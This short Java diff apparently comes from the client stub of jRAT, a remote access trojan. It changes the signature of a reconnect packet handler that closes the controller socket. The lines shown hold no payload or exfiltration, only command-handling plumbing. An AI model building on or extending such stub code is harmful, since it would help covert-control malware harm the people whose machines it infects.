@@ -5,7 +5,7 @@ import se.jrat.stub.Connection;
 public class Packet45Reconnect extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		Connection.instance.getSocket().close();
 	}
 
